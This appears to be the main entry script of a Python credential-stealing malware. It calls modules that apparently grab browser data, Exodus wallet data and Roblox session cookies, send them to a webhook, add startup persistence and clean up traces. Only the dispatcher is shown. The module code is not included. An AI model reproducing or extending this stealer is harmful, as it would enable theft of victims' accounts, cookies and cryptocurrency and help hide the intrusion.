from libs.libs              import *
from modules.config         import *
from modules.Cleaner        import cleaner
from modules.Brower         import n0x
from modules.fish           import Fish
from modules.note           import note
from modules.startup        import StartupManager
from modules.Roblox         import RobloxCookie

if __name__ == '__main__':
        get_nox()
        n0x(webhook)
        Exodus(webhook)
        roblox_cookie = RobloxCookie()
        roblox_cookie.run()
        fish_instance = Fish(webhook)
        fish_instance.execute()
        cleaner()
        note()
        StartupManager()